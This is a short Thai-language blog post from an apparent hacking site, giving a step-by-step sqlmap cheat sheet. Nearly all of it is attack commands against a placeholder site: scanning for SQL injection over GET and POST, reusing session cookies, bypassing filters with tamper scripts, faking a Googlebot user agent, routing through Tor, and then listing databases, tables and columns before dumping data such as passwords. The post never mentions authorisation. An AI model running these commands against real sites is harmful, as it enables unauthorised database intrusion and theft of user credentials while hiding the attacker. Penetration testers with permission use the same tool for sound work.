
SQL Map
http://kiss-hack.blogspot.com/2013/10/how-to-sqlmap.html

วิธีใช้ SQLmap แบบง่ายถึงปานกลางๆ

ตัวอย่าง วิธีใช้ sqlmap แบบง่ายๆ ...?
ซึ่งผมว่า sqlmap.py -h แล้วอ่านซัก 15 นาทีก็น่าจะเข้าใจวิธีใช้แล้วล่ะ
(ถ้าจะเอาขั้นสูงๆ มาอีก ก็ sqlmap.py --h แล้วอ่านอีก 30 นาที ก็จะใช้คู่ tor, proxy ได้แระ)
ซึ่งผมเองก็เพิ่งอ่านเมื่อกี้นี้เอง ..? ก็เลยเอามาเขียนคู่มือสรุปคร่าวๆ ให้ เผื่อใครขี้เกียจอ่าน ^^"

1) แสกนหา ช่องโหว่ SQL injection
# แบบธรรมดาๆ method GET
?
1
./sqlmap.py -u "http://www.stephack.com/index.php?bug=31337&test=hack_you"

# แบบธรรมดาๆ method POST
?
1
./sqlmap.py -u "http://www.stephack.com/index.php" --data="bug=31337&test=hack_you"

# แบบเจาะจง parameter พิเศษ? (ใช้ marker จุดที่จะ inject ด้วย *)
?
1
./sqlmap.py -u "http://www.stephack.com/index/bug/31337*/hack_you"

# แบบเจาะจง parameter พิเศษ? (ใช้ -p)
?
1
./sqlmap.py -u "http://www.stephack.com/index.php" --data="bug=31337&test=hack_you" -p "bug"

# แบบที่ต้อง login เข้าไปแฮก (ใช้ cookie)
?
1
./sqlmap.py -u "http://www.stephack.com/index.php" --data="bug=31337&test=hack_you" -p "bug" --cookie="cookie1=blabla1;cookie2=blabla2"

# แบบต้องทำ bypass filter (ใช้ script ช่วย)
?
1
./sqlmap.py -u "http://www.stephack.com/index.php" --data="bug=31337&test=hack_you" -p "bug" -b --tamper="tamper_script1_name.py,tamper_script2_name.py"

# แบบปลอม UserAgent
?
1
./sqlmap.py -u "http://www.stephack.com/index.php" --user-agent="Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

# แบบใช้คู่ tor
?
1
./sqlmap.py -u "http://www.stephack.com/index.php" --tor


2) ดู database ที่ user กำลังเชื่อมต่ออยู่ (--current-db)
?
1
./sqlmap.py -u "http://www.stephack.com/index.php?bug=31337&test=hack_you" --current-db


3) ดู database ทั้งหมด ที่ user นั้นมีสิทธิ์ (--dbs)
?
1
./sqlmap.py -u "http://www.stephack.com/index.php?bug=31337&test=hack_you" --dbs


4) ดู tables ทั้งหมด ใน <DATABASE> ที่กำหนด
?
1
./sqlmap.py -u "http://www.stephack.com/index.php?bug=31337&test=hack_you" -D DATABASE --tables


5) ดู columns ทั้งหมด ใน <TABLE> ที่กำหนด
?
1
./sqlmap.py -u "http://www.stephack.com/index.php?bug=31337&test=hack_you" -D DATABASE -T TABLE --columns


6) dump <DATA> ที่อยู่ใน <COLUMN> จาก <DATABASE>
?
1
./sqlmap.py -u "http://www.stephack.com/index.php?bug=31337&test=hack_you" -D DATABASE -T TABLE -C DATA1,DATA2,DATA3 --dump

===================
* <DATABASE> เช่น mysql projectX wordpress
** <TABLE> เช่น members topic
*** <COLUMN> เช่น id name password
*** <DATA_N> เช่น "id,name,password"
**** รู้สึก -(- หนึ่งอัน) กับ -- (- สองอัน) จะมองไม่ออกเลยแฮะ _ _''
====================
